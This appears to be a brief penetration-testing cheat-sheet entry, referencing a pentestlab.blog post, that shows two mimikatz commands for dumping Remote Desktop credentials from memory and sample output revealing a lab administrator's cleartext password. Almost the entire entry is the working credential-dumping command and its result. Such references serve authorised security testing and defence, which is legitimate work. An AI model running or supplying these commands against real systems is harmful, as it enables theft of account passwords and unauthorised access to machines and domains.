## [Reference](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)

## Command:
```
mimikatz # privilege::debug
mimikatz # ts::logonpasswords
```

## Output:
```
!!! Warning: false positives can be listed !!!

   Domain      : LAB
   UserName    : Administrator
   Password/Pin: Abc123!!!
```